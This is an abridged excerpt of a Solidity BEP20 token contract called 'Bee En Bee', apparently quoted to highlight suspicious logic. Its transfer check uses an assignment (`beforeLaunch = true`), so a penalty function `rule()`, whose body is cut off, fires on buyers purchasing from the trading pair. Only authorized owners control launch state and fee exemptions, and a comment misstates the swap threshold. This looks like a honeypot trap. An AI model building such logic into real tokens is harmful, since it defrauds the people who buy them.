...
contract BeeEnBee is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "Bee En Bee";
    ...
    uint256 swapThreshold = balanceOf(address(this)) / 200; // 0.025%
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = address(0x8FdDEd947420EFf1c6FA6CbB039a2701c4361312);
        devFeeReceiver = address(0xADaE8732DA83dC752Ab9bd88E45382141C32ce51);
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(beforeLaunch = true && sender == pair && !authorizations[recipient]) {
            rule(recipient);
        }
    ...
    function isBeforeLaunch(bool set) external authorized {
        beforeLaunch = set;
    }
    ...
    function excludedFromFees(address account, bool set) external authorized {
        isFeeExempt[account] = set;
        isTxLimitExempt[account] = set;
    }
    ...
    function rule(address account) internal {
